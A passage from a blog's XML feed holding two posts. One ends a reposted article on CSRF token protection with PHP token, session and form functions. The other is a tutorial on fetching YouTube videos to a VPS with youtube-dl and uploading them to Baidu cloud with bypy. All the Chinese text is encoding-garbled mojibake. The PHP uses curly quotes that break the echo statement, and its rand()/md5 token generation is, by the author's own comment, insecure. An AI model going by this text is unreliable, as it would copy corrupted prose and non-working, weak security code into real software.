Tokensæ—¶ï¼Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼šå°±æ˜¯â€œå¹¶è¡Œä¼šè¯çš„å…¼å®¹â€ã€‚å¦‚æœç”¨æˆ·åœ¨ä¸€ä¸ªç«™ç‚¹ä¸ŠåŒæ—¶æ‰“å¼€äº†ä¸¤ä¸ªä¸åŒçš„è¡¨å•ï¼ŒCSRFä¿æŠ¤æªæ–½ä¸åº”è¯¥å½±å“åˆ°ä»–å¯¹ä»»ä½•è¡¨å•çš„æäº¤ã€‚è€ƒè™‘ä¸€ä¸‹å¦‚æœæ¯æ¬¡è¡¨å•è¢«è£…å…¥æ—¶ç«™ç‚¹ç”Ÿæˆä¸€ä¸ªä¼ªéšæœºå€¼æ¥è¦†ç›–ä»¥å‰çš„ä¼ªéšæœºå€¼å°†ä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µï¼šç”¨æˆ·åªèƒ½æˆåŠŸåœ°æäº¤ä»–æœ€åæ‰“å¼€çš„è¡¨å•ï¼Œå› ä¸ºæ‰€æœ‰å…¶ä»–çš„è¡¨å•éƒ½å«æœ‰éæ³•çš„ä¼ªéšæœºå€¼ã€‚å¿…é¡»å°å¿ƒæ“ä½œä»¥ç¡®ä¿CSRFä¿æŠ¤æªæ–½ä¸ä¼šå½±å“é€‰é¡¹å¡å¼çš„æµè§ˆæˆ–è€…åˆ©ç”¨å¤šä¸ªæµè§ˆå™¨çª—å£æµè§ˆä¸€ä¸ªç«™ç‚¹ã€‚</p><p>ã€€ã€€ä»¥ä¸‹æˆ‘çš„å®ç°:</p><p>ã€€ã€€1).å…ˆæ˜¯ä»¤ç‰Œç”Ÿæˆå‡½æ•°(gen_token())ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">gen_token</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> ã€€ã€€ã€€ã€€<span class="comment">//è¿™é‡Œæˆ‘æ˜¯è´ªæ–¹ä¾¿ï¼Œå®é™…ä¸Šå•ä½¿ç”¨Rand()å¾—å‡ºçš„éšæœºæ•°ä½œä¸ºä»¤ç‰Œï¼Œä¹Ÿæ˜¯ä¸å®‰å…¨çš„ã€‚</span></span><br><span class="line">ã€€ã€€ã€€ã€€<span class="comment">//è¿™ä¸ªå¯ä»¥å‚è€ƒæˆ‘å†™çš„Findbugsç¬”è®°ä¸­çš„ã€ŠRandom object created and used only onceã€‹</span></span><br><span class="line">          $token = md5(uniqid(rand(), <span class="keyword">true</span>));</span><br><span class="line">          <span class="keyword">return</span> $token;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>2).ç„¶åæ˜¯Sessionä»¤ç‰Œç”Ÿæˆå‡½æ•°(gen_stoken())ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_stoken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     $pToken = <span class="string">""</span>;</span><br><span class="line">ã€€ã€€ã€€<span class="keyword">if</span>($_SESSION[STOKEN_NAME]  == $pToken)&#123;</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€<span class="comment">//æ²¡æœ‰å€¼ï¼Œèµ‹æ–°å€¼</span></span><br><span class="line">ã€€ã€€ã€€ã€€ã€€$_SESSION[STOKEN_NAME] = gen_token();</span><br><span class="line">ã€€ã€€ã€€&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">ã€€ã€€ã€€ã€€ã€€<span class="comment">//ç»§ç»­ä½¿ç”¨æ—§çš„å€¼</span></span><br><span class="line">ã€€ã€€ã€€&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3).WEBè¡¨å•ç”Ÿæˆéšè—è¾“å…¥åŸŸçš„å‡½æ•°ï¼šã€€ã€€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">gen_input</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          gen_stoken();</span><br><span class="line">          <span class="keyword">echo</span> â€œ&lt;input type=\â€hidden\â€ name=\â€<span class="string">" . FTOKEN_NAME . â€œ\â€</span></span><br><span class="line"><span class="string">               value=\â€"</span> . $_SESSION[STOKEN_NAME] . â€œ\â€&gt; â€œ;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>4).WEBè¡¨å•ç»“æ„ï¼š</p><pre><code class="html"><span class="php"><span class="meta">&lt;?php</span></span><span class="php">     session_start();</span><span class="php">     <span class="keyword">include</span>(<span class="string">'functions.php'</span>);</span><span class="php"><span class="meta">?&gt;</span></span><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">â€POSTâ€</span> <span class="attr">action</span>=<span class="string">â€transfer.phpâ€</span>&gt;</span>     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€textâ€</span> <span class="attr">name</span>=<span class="string">â€toBankIdâ€</span>&gt;</span>     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€textâ€</span> <span class="attr">name</span>=<span class="string">â€moneyâ€</span>&gt;</span>     <span class="php"><span class="meta">&lt;?</span> gen_input(); <span class="meta">?&gt;</span></span>     <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">â€submitâ€</span> <span class="attr">name</span>=<span class="string">â€submitâ€</span> <span class="attr">value</span>=<span class="string">â€Submitâ€</span>&gt;</span><span class="tag">&lt;/<span class="name">FORM</span>&gt;</span></code></pre><p>5).æœåŠ¡ç«¯æ ¸å¯¹ä»¤ç‰Œï¼š</p><p>ã€€ã€€è¿™ä¸ªå¾ˆç®€å•ï¼Œè¿™é‡Œå°±ä¸å†å•°å—¦äº†ã€‚</p><p>ã€€ã€€ä¸Šé¢è¿™ä¸ªå…¶å®ä¸å®Œå…¨ç¬¦åˆâ€œå¹¶è¡Œä¼šè¯çš„å…¼å®¹â€çš„è§„åˆ™ï¼Œå¤§å®¶å¯ä»¥åœ¨æ­¤åŸºç¡€ä¸Šä¿®æ”¹ã€‚</p><hr><p>æ–‡ç« è½¬è½½è‡ªï¼š<a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="noopener">https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CRSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPSç¦»çº¿ä¸‹è½½ä¹‹äºŒ</title>
      <link href="/post/vps-download-part-II/"/>
      <url>/post/vps-download-part-II/</url>
      
        <content type="html"><![CDATA[<p>è§£å†³VPSä¸‹è½½å¥½çš„æ–‡ä»¶å¦‚ä½•åŒæ­¥åˆ°ç™¾åº¦äº‘çš„é—®é¢˜ã€‚</p><a id="more"></a><p>ç°åœ¨æˆ‘ä»¬å·²ç»å°†æ–‡ä»¶ä¸‹è½½åˆ°æˆ‘ä»¬çš„vpsäº†ï¼Œä½†æ€ä¹ˆå–å›æœ¬åœ°å‘¢ï¼Ÿ</p><p>æ¥¼ä¸»é¦–å…ˆå°è¯•çš„æ˜¯ç”¨wgetå‘½ä»¤ä¸‹è½½åˆ°æœåŠ¡å™¨ï¼Œç„¶åç”¨FTPå–å›æœ¬åœ°ï¼Œåæ¥æµ‹è¯•å‘ç°FTPåœ¨åŒä¸€æ—¶é—´ã€åŒä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åœ¨500KB/ï¼Œä¸‹è½½æœ€é«˜50KB/ï¼Œè¿™ä¹Ÿå¤ªé¸¡è‚‹äº†ï¼Œä¸€ç•ªGoogleåå‘ç°å¯ä»¥ä½¿ç”¨<a href="https://github.com/houtianze/bypy" target="_blank" rel="noopener">Bypy</a>åŒæ­¥åˆ°ç™¾åº¦äº‘ã€‚</p><p>å…³äºåŒæ­¥åˆ°ç™¾åº¦äº‘ï¼Œç”±äºå·²ç»æœ‰åšä¸»å†™äº†ä¸€ç¯‡å¾ˆå¥½çš„æ–‡ç« ï¼Œæˆ‘å°±å…¨æ–‡è½¬è½½äº†ã€‚</p><blockquote><p>å‰ä¸€æ®µæ—¶é—´æ¥äº†ä¸ªå°ä»»åŠ¡ï¼Œè¦æŠŠYouTubeä¸Šçš„å‡ ç™¾ä¸ªè§†é¢‘ä¸‹è½½å›æ¥ï¼Œç”¨ç™¾åº¦äº‘ç½‘ç›˜åˆ†äº«ç»™å…¬å¸çš„åŒäº‹ä¾›å­¦ä¹ ä½¿ç”¨ã€‚</p><p>å½“è€æ¿å‘é‚®ä»¶é—®æˆ‘è¿™äº‹å„¿æ˜¯å¦èƒ½åŠæ—¶ï¼Œæˆ‘å¾ˆå¿«å°±å›å¤è¯´æ²¡é—®é¢˜ï¼Œå› ä¸ºâ€œä»YouTubeä¸‹è½½è§†é¢‘â€è¿™ç§äº‹ä¹‹å‰æˆ‘ä¹Ÿä¸æ˜¯æ²¡åšè¿‡ã€‚ç½‘ä¸Šæœ‰ä¸€å¤§æ‰¹åœ¨çº¿å·¥å…·èƒ½å¤Ÿå—…æ¢å‡ºYouTubeè§†é¢‘çš„ä¸‹è½½é“¾æ¥ï¼Œç„¶åç›´æ¥ç”¨å¸¸è§„æ‰‹æ®µï¼ˆè¿…é›·å•¥çš„ï¼‰ä¸‹è½½å°±å¯ä»¥äº†ã€‚æœ¬åœ°ä¸‹è½½å·¥å…·ä¹Ÿä¸å°‘ï¼Œå¦‚è‘—åçš„IDMå°±èƒ½å¤Ÿç›´æ¥ä¸‹è½½ç½‘é¡µä¸ŠåµŒå¥—çš„è§†é¢‘æ–‡ä»¶ï¼Œå‡ ä¹æ˜¯ä¸‡èƒ½çš„ã€‚ä¸è¿‡ï¼Œè¿™æ¬¡çš„ä»»åŠ¡æœ‰ç‚¹å¤æ‚ï¼šä¸€æ¥è¦ä¸‹è½½çš„æ–‡ä»¶å¤ªå¤šäº†ï¼Œæˆ‘æ€»ä¸èƒ½é‡å¤æ“ä½œå‡ ç™¾æ¬¡æ¥ä¸‹è½½æ¯ä¸ªè§†é¢‘å§ï¼›äºŒæ¥ï¼Œè¿˜å¾—ä¸Šä¼ åˆ°ç™¾åº¦äº‘ï¼Œè¿™ä¹ˆå¤šè§†é¢‘ï¼Œé æˆ‘å®¶é‡Œé‚£å°æ°´ç®¡ï¼Œæ²¡ä¸ªå‡ å¤©å‡ å¤œææ€•æ˜¯ä¸Šä¼ ä¸å®Œçš„ï¼Œå¤šè´¹åŠ²å‘€ã€‚</p><p>ç„¶åæˆ‘å°±å¼€å§‹ç¢ç£¨è¿™ä»¶äº‹èƒ½ä¸èƒ½æ›´è‡ªåŠ¨åŒ–ã€æ›´é«˜æ•ˆä¸€äº›æ¥å®ç°ã€‚å‘ƒï¼Œæ”¾ç‹—ä¸ŠGoogleæœäº†ä¸€ä¸‹ï¼Œæ‰¾åˆ°äº†å‡ ä¸ªå¤§æ€å™¨ï¼Œå‚è€ƒäº†ä¸€ä¸‹å„ä½å¤§ç¥çš„æ•™ç¨‹åï¼Œæˆ‘ä¹Ÿæ‹¼å‡‘å‡ºäº†ä¸€ä¸ªè§£å†³æ–¹æ¡ˆã€‚</p><p>é•¿è¯çŸ­è¯´ï¼š</p><p>åœ¨ç¾å›½VPSä¸Šå®‰è£…YouTubeä¸“ç”¨ä¸‹è½½å·¥å…·ï¼Œè¿œç¨‹ä¸‹è½½æƒ³è¦çš„YouTubeè§†é¢‘åˆ°æœåŠ¡å™¨ä¸Šï¼›åœ¨VPSä¸Šå®‰è£…ç™¾åº¦äº‘ç½‘ç›˜ä¸Šä¼ å·¥å…·ï¼Œå°†å·²ç»ä¸‹è½½åˆ°VPSä¸­çš„è§†é¢‘ä¸Šä¼ åˆ°äº‘ç«¯ã€‚</p><p>è¿™ä¸ªæ–¹æ¡ˆçš„å¥½å¤„å¾ˆæ˜æ˜¾ï¼šç”¨ä½äºç¾å›½çš„VPSä¸‹è½½æœ¬èº«æœåŠ¡å™¨å°±åœ¨ç¾å›½çš„YouTbeç½‘ç«™è§†é¢‘ï¼Œé€Ÿåº¦ç›¸å½“å¿«ï¼ˆå®æµ‹å¯ä»¥è¶…è¿‡60MB/sï¼‰ã€‚ä»ç¾å›½VPSä¸Šä¼ æ–‡ä»¶åˆ°ç™¾åº¦äº‘ï¼Œé€Ÿåº¦è™½ç„¶å—é™ï¼ˆä¸€èˆ¬æ˜¯å‡ ç™¾Kbæ¯ç§’ï¼Œå¶è§è¶…è¿‡1MB/sçš„ï¼‰ï¼Œä½†ä»æ¯”æˆ‘åœ¨å›½å†…æœ¬åœ°çš„ä¸Šä¼ ç½‘é€Ÿè¦å¿«å¾—å¤šã€‚æ›´é‡è¦çš„æ˜¯ï¼Œè¿™ä¸ªæ–¹æ¡ˆæ˜¯é«˜åº¦è‡ªåŠ¨åŒ–ã€æ‰¹é‡è¿›è¡Œçš„ï¼Œä¸ç”¨æ‰‹åŠ¨å¯¹ä»˜æ¯ä¸ªè§†é¢‘ã€‚</p><p>çŸ­è¯é•¿è¯´ï¼š</p><p>æ¥ä¸‹æ¥è¦å†™çš„è¯¦ç»†æ•™ç¨‹ï¼Œæ˜¯ä¸€ä¸ªå¤§æ‚çƒ©ã€‚ä½ åœ¨ç½‘ä¸Šèƒ½æ‰¾åˆ°çš„ç‰¹å®šæ•™ç¨‹ï¼Œéƒ½æ˜¯æœ‰ç‰¹å®šé™åˆ¶æ¡ä»¶çš„ï¼Œä¾‹å¦‚ä½ çš„VPSç”¨çš„æ˜¯å•¥æ“ä½œç³»ç»Ÿï¼Œä½ è¦å®ç°å¤šå¤§ç¨‹åº¦çš„è‡ªåŠ¨åŒ–ï¼Œç­‰ç­‰ã€‚åœ¨å®Œæˆè¿™ä¸ªæ•™ç¨‹çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä¹Ÿè¸©äº†ä¸å°‘å‘ï¼Œå¹¸äºæœ‰ä¸‡èƒ½çš„Googleç›¸åŠ©ã€‚</p><h2 id="1-å®‰è£…VPSæ“ä½œç³»ç»Ÿ"><a href="#1-å®‰è£…VPSæ“ä½œç³»ç»Ÿ" class="headerlink" title="1 å®‰è£…VPSæ“ä½œç³»ç»Ÿ"></a>1 å®‰è£…VPSæ“ä½œç³»ç»Ÿ</h2><p>æˆ‘ç”¨çš„æ˜¯DigitalOceanï¼ˆè‹¥ä½¿ç”¨æˆ‘çš„æ¨èé“¾æ¥æ³¨å†ŒDigitalOceanï¼Œæ‚¨çš„è´¦æˆ·å¯ä»¥ç«‹å³è·å¾—10ç¾é‡‘ï¼Œç›¸å½“äºå…è´¹è·å¾—ä¸¤ä¸ªæœˆçš„ä½¿ç”¨æƒï¼‰æœ€åŸºç¡€çš„å¥—é¤ï¼Œæ¯æœˆ5$ï¼Œ20Gçš„SSDå‚¨å­˜ç©ºé—´ï¼Œ1Tæµé‡ã€‚å®‰è£…çš„æ“ä½œç³»ç»Ÿæ˜¯CentOS 7ï¼ˆè¯·æ³¨æ„æ“ä½œç³»ç»Ÿçš„é€‰æ‹©ï¼Œè¿™å¾ˆé‡è¦ï¼Œåé¢æˆ‘ä¼šæåˆ°åŸå› ï¼‰ï¼ŒèŠ‚ç‚¹ä¸ºæ—§é‡‘å±±ï¼ˆæ®è¯´ä»å¤§é™†è®¿é—®ä¼šæ¯”è¾ƒå¿«ï¼‰ã€‚æ‰€ä»¥ï¼Œå¦‚æœä½ ä¹Ÿæ˜¯DOç”¨æˆ·çš„è¯ï¼Œå¯ä»¥å®Œå…¨ç…§æˆ‘è¿™ç¯‡æ•™ç¨‹æ¥åšï¼Œå‡†æ²¡é—®é¢˜ã€‚ä¸æ˜¯çš„è¯ï¼Œè¯·é…Œæƒ…å‚è€ƒå°±å¥½äº†ï¼Œå…¶ä»–é—®é¢˜æˆ‘ä¸è´Ÿè´£è§£ç­”å“ˆï¼Œæ¯•ç«Ÿï¼Œæˆ‘æ˜¯ä¸€ä¸ªä¼ªæŠ€æœ¯æµâ€¦â€¦</p><p>é¦–å…ˆè¦èµä¸‹DigitalOceançš„VPSç”¨èµ·æ¥çœŸæ˜¯æ–¹ä¾¿ï¼Œç‚¹å‡ ä¸‹é¼ æ ‡å°±èƒ½åˆ›å»ºå¥½ä¸€å°æœåŠ¡å™¨ã€‚ç†è®ºä¸Šç”¨SSHå¯†é’¥ç™»å½•ä¼šæ›´å®‰å…¨ï¼Œä¸è¿‡æˆ‘å·æ‡’ï¼Œåªæ˜¯ç®€å•ç”¨LastPassç”Ÿæˆä¸€ä¸ªå‡ åä½é•¿åº¦çš„éšæœºå¯†ç ï¼Œéœ€è¦ç”¨åˆ°å°±å¤åˆ¶ç²˜è´´ä¸€ä¸‹å¥½äº†ï¼ˆè¯·å¤§å®¶ä¸è¦å‘æˆ‘å­¦ä¹ â€¦â€¦ï¼‰ã€‚ç¦ç”¨rootè´¦å·ç™»å½•ï¼Œä¿®æ”¹SSHç«¯å£å·ä»€ä¹ˆçš„ï¼Œè¿™äº›å®‰å…¨æªæ–½ä¹Ÿå¯ä»¥åšä¸‹ï¼Œæˆ‘å°±ä¸å¤šè¯´äº†ï¼Œä¸å¤ªæ¸…æ¥šçš„è¯è¯·è‡ªè¡ŒGoogleã€‚</p><p>å‰é¢æè¿‡VPSçš„æ“ä½œç³»ç»Ÿé—®é¢˜ï¼Œä¸ºå•¥æˆ‘ç”¨CentOS 7å‘¢ï¼Ÿå› ä¸ºè¿™ä¸ªç‰ˆæœ¬é»˜è®¤è‡ªå¸¦çš„Pythonæ˜¯2.7.5ï¼ˆæˆªè‡³æœ¬æ–‡å‘å¸ƒæ—¶æ˜¯è¿™æ ·çš„ï¼‰ï¼Œè€Œè¿™ä¸ªæ•™ç¨‹ä¸­ä¼šç”¨åˆ°çš„ç™¾åº¦äº‘ç½‘ç›˜Linuxå®¢æˆ·ç«¯ï¼ˆbypyï¼‰ä¾èµ–çš„Pythonç‰ˆæœ¬å·ä¸º2.7xã€‚ä¸€å¼€å§‹æˆ‘è£…äº†ä¸ªCentOS 6ï¼Œå…¶è‡ªå¸¦Python 6.xï¼Œä¸ç¬¦åˆè¦æ±‚ï¼›Googleäº†å¥½å¤šæ•™ç¨‹ï¼Œè¿˜æ˜¯æ²¡èƒ½è£…ä¸ŠPython 2.7xï¼ˆåœ¨DOçš„è¿™ä¸ªç³»ç»Ÿä¸Šéœ€è¦è‡ªè¡Œç¼–è¯‘Pythonï¼Œå„ç§æŠ¥é”™å¾ˆæ— å¥ˆï¼‰ï¼›æœ€åå†³å®šæ”¾å¼ƒCentOS 6ï¼Œæ¢æˆ7ï¼Œå› ä¸ºæœ‰é‚£ä¸ªå·¥å¤«æŠ˜è…¾Pythonï¼Œæˆ‘è¿˜ä¸å¦‚å»çœ‹å‡ é›†ç¾å‰§æ˜¯å§ï¼Œå‘ƒï¼Œå¥½åƒæˆ‘åˆæ— æ„ä¸­æš´éœ²äº†ä»€ä¹ˆâ€¦â€¦</p><h2 id="2-å®‰è£…youtube-dl"><a href="#2-å®‰è£…youtube-dl" class="headerlink" title="2 å®‰è£…youtube-dl"></a>2 å®‰è£…youtube-dl</h2><p>ä¼ è¯´ä¸­çš„ç¬¬ä¸€ä¸ªå¤§æ€å™¨ç»ˆäºç²—çº¿äº†ï¼šyoutube-dlã€‚è¿™ä¸ªå·¥å…·å¯ä»¥ç”¨æ¥ä¸‹è½½ä¸€ç³»åˆ—å›½å¤–ç½‘ç«™çš„åœ¨çº¿è§†é¢‘ï¼Œå¦‚æ²¹ç®¡å®¶çš„ã€‚å®ƒæ—¢æœ‰æœ¬åœ°å®¢æˆ·ç«¯ï¼Œä¹Ÿå¯ä»¥è¢«éƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šã€‚</p><p>ç”¨Puttyç™»å…¥VPSåï¼Œä¾æ¬¡æ‰§è¡Œä»¥ä¸‹ä¸¤æ¡å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;wget https://yt-dl.org/downloads/latest/youtube-dl -O /usr/<span class="built_in">local</span>/bin/youtube-dl</span><br><span class="line">&gt;chmod a+rx /usr/<span class="built_in">local</span>/bin/youtube-dl</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ²¡äº†ã€‚æ˜¯çš„å°±æ˜¯è¿™ä¹ˆç®€å•ï¼Œç°åœ¨ä½ å·²ç»è£…å®Œyoutube-dlï¼Œå¯ä»¥åœ¨VPSä¸Šè¿œç¨‹ä¸‹è½½æŒ‡å®šçš„YouTubeè§†é¢‘äº†ã€‚</p><p>æœ€ç®€å•çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><p><code>youtube-dl video-url</code></p><p>æŠŠä¸Šé¢çš„è¿™ä¸ªvideo-urlæ¢æˆå…·ä½“æŸä¸ªYouTubeè§†é¢‘çš„URLå°±å¯ä»¥ç›´æ¥ä¸‹è½½äº†ã€‚æ³¨æ„ï¼Œyoutube-dlä¼šé»˜è®¤ä¸‹è½½è§†é¢‘åˆ°å½“å‰æ‰§è¡Œå‘½ä»¤çš„ç›®å½•ä¸‹ã€‚</p><p>YouTubeæœ‰PlayliståŠŸèƒ½ï¼Œå³æ’­æ”¾åˆ—è¡¨ï¼Œä½ å¯ä»¥ç”¨Googleè´¦å·ç™»å½•ï¼Œç„¶åå°±å¯ä»¥æŠŠè‹¥å¹²è§†é¢‘æ·»åŠ ä¿å­˜åˆ°Playlistã€‚å¦‚æœä½ æƒ³è¦æ‰¹é‡ä¸‹è½½æŸä¸ªPlaylistçš„è§†é¢‘ï¼Œå°±å¯ä»¥æŠŠå‰é¢é‚£æ¡ä¸‹è½½å‘½ä»¤ä¸­çš„ video-urlæ¢æˆå…·ä½“Playlistçš„é“¾æ¥ã€‚è¯å¥è¯è¯´ï¼Œæƒ³è¦ä¸€æ¬¡ä¸‹è½½å¤šä¸ªYouTubeè§†é¢‘ï¼Œä½ å¯ä»¥è€ƒè™‘ç”¨è¿™ä¸ªPlayliståŠŸèƒ½ã€‚</p><p>ä¸è¿‡å‘¢ï¼Œåƒæœ¬æ–‡å¼€å¤´æåˆ°çš„è¿™ä¸ªä»»åŠ¡ï¼Œå¦‚æœæˆ‘è¦æ‰‹åŠ¨æ·»åŠ å‡ ç™¾ä¸ªè§†é¢‘åˆ°Playlisté‚£å¾—ç´¯åˆ°æ‰‹æŠ½ç­‹ï¼šæˆ‘å¾—å…ˆç‚¹å¼€æ¯ä¸€ä¸ªè§†é¢‘çš„å…·ä½“é“¾æ¥ï¼Œç„¶åå†ç‚¹ä¸¤ä¸‹é¼ æ ‡æ‰èƒ½å°†ä¹‹æ·»åŠ è¿›Playlistã€‚å¥½äº†ä¸ç»•å¼¯äº†ï¼Œè¯´è¿™ä¹ˆå¤šï¼Œå°±æ˜¯æƒ³çƒ˜æ‰˜å‡ºyoutube-dlçš„å¦ä¸€ä¸ªæ¿€åŠ¨äººå¿ƒçš„åŠŸèƒ½ï¼šæ”¯æŒè¯»å–ä¸‹è½½é“¾æ¥åˆ—è¡¨æ–‡ä»¶ã€‚è¿™æ„å‘³ç€æˆ‘å¯ä»¥å…ˆæŠŠæ‰€æœ‰ä¸‹è½½é“¾æ¥æ•´ç†å¥½åæ”¾è¿›ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œç„¶åè®©youtube-dlå»è¯»å–è¿™ä¸ªtxtæ–‡ä»¶å°±è¡Œäº†ï¼Œæ¥ä¸‹æ¥å®ƒå°±ä¼šè‡ªåŠ¨ä¸‹è½½å…¨éƒ¨çš„è§†é¢‘ã€‚è¯¥æ–¹æ³•çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><p><code>youtube-dl -a video_url.txt</code></p><p>è¿™é‡Œçš„ -a å‚æ•°è¡¨ç¤ºè¯»å–å¤–éƒ¨é“¾æ¥æ–‡ä»¶ã€‚</p><p>å…·ä½“ç»†èŠ‚æ“ä½œåœ¨åé¢ä¼šæåˆ°ï¼Œè¯·è€å¿ƒå¾€ä¸‹çœ‹â€¦â€¦</p><h2 id="3-å®‰è£…byby"><a href="#3-å®‰è£…byby" class="headerlink" title="3 å®‰è£…byby"></a>3 å®‰è£…byby</h2><p>Bybyæ˜¯ä¸€ä¸ªç™¾åº¦äº‘ç½‘ç›˜çš„Pythonå®¢æˆ·ç«¯ï¼Œå¯åœ¨Linuxç¯å¢ƒä¸‹é€šè¿‡å‘½ä»¤è¡Œæ¥æ“ä½œã€‚</p><p>åœ¨æœ¬æ–‡çš„æ“ä½œç¯å¢ƒä¸‹ï¼Œå®‰è£…bybyéœ€è¦æ›´å¤šçš„æ­¥éª¤ï¼Œbybyå®˜ç½‘æ²¡æœ‰ä»‹ç»é‚£ä¹ˆè¯¦ç»†ï¼Œæ‰€ä»¥æˆ‘å‚è€ƒäº†å…¶ä»–ç½‘å‹çš„æ•™ç¨‹ã€‚</p><h3 id="å®‰è£…Git"><a href="#å®‰è£…Git" class="headerlink" title="å®‰è£…Git"></a>å®‰è£…Git</h3><p><code>yum install git</code></p><h3 id="å®‰è£…Python-Pip"><a href="#å®‰è£…Python-Pip" class="headerlink" title="å®‰è£…Python Pip"></a>å®‰è£…Python Pip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;yum -y install epel-release</span><br><span class="line">&gt;yum -y install python-pip</span><br><span class="line">&gt;yum clean all</span><br></pre></td></tr></table></figure><p>è¯´æ˜ï¼šå…ˆè£…æ‰©å±•æºEPELå†è£…Python Pipæ‰ä¸ä¼šæŠ¥é”™ã€‚</p><h3 id="å®‰è£…Requests"><a href="#å®‰è£…Requests" class="headerlink" title="å®‰è£…Requests"></a>å®‰è£…Requests</h3><p>pip install requests</p><p>å®Œæˆä»¥ä¸Šæ­¥éª¤åï¼Œæ‰å¼€å§‹æ­£å¼å®‰è£…bypyã€‚</p><p>ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹ä¸‰è¡Œå‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;git <span class="built_in">clone</span> https://github.com/houtianze/bypy byby/</span><br><span class="line">&gt;<span class="built_in">cd</span> byby/</span><br><span class="line">&gt;python bypy.py list</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶çš„å‘½ä»¤è¡Œç•Œé¢ä¼šå‡ºç°æç¤ºï¼ŒæŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ¥æˆæƒä½ çš„ç™¾åº¦äº‘è´¦å·ä½¿ç”¨bypyå®¢æˆ·ç«¯ï¼š</p><p>å·¦é”®é€‰ä¸­ç”¨äºç™¾åº¦è´¦å·æˆæƒçš„é‚£è¡ŒURLï¼Œå³å¯å¤åˆ¶è¯¥æ–‡æœ¬ï¼ˆåœ¨Puttyä¸­é€‰ä¸­å³å¯å¤åˆ¶ï¼Œä¸ç”¨Ctrl+Cï¼‰ï¼Œåœ¨æµè§ˆå™¨ä¸­æ‰“å¼€æ­¤é“¾æ¥ã€‚<br>ç™»å½•ä½ çš„ç™¾åº¦è´¦å·ï¼Œç„¶åå¤åˆ¶æˆæƒç ã€‚<br>å›åˆ°Puttyå‘½ä»¤è¡Œç•Œé¢ï¼Œç²˜è´´æˆæƒç è¿›å»ï¼Œå›è½¦å³å¯å¼€å§‹å¯åŠ¨æˆæƒæ“ä½œã€‚<br>ç¨ç­‰å‡ ç§’ï¼Œæˆæƒå³å¯æˆåŠŸã€‚</p><p>ä¸ºäº†æ–¹ä¾¿åœ¨ä»»æ„ç›®å½•ä¸‹ä½¿ç”¨bypyå‘½ä»¤ï¼Œè¿˜éœ€è¦è®¾ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">cd</span> /byby</span><br><span class="line">&gt;cp bypy.py /usr/bin</span><br></pre></td></tr></table></figure><p>å®Œæˆä»¥ä¸Šè®¾ç½®åï¼Œå¦‚æœè¦å°†VPSæŸä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¸Šä¼ åˆ°ç™¾åº¦äº‘ï¼Œæœ€ç®€å•çš„å‘½ä»¤å¦‚ä¸‹ï¼š</p><p><code>bypy.py upload</code></p><p>è¿˜å¯ä»¥åŠ å‚æ•°ï¼Œå¦‚ -v å¯ä»¥æ˜¾ç¤ºä¸Šä¼ è¿›åº¦ï¼š</p><p><code>bypy.py upload -v</code></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œæœ¬æ–¹æ¡ˆä¸Šä¼ 